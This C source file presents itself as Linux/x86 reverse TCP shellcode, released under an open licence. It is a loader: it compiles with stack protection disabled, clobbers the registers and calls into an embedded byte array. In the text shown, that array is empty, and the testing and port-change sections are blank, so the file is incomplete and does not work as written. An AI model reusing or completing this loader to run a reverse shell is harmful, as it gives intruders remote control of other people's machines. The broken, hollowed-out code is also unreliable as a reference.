/*

 Shell Reverse TCP Shellcode - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 shellcode

 * 72 bytes
 * null-bytes free if the port and address are
 * the ip address and port number are easily changeable (2nd to 5th bytes are the IP) and (9th and 10th are the Port)
 

 # gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
 # ./shellcode

 Testing
 # 
 # ./shellcode 

*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"";

main ()
{

        // When the IP contains null-bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp");


	// Replacing the port number and Calling the shellcode

	__asm__ ("call code");


	// Change the port number

	

}
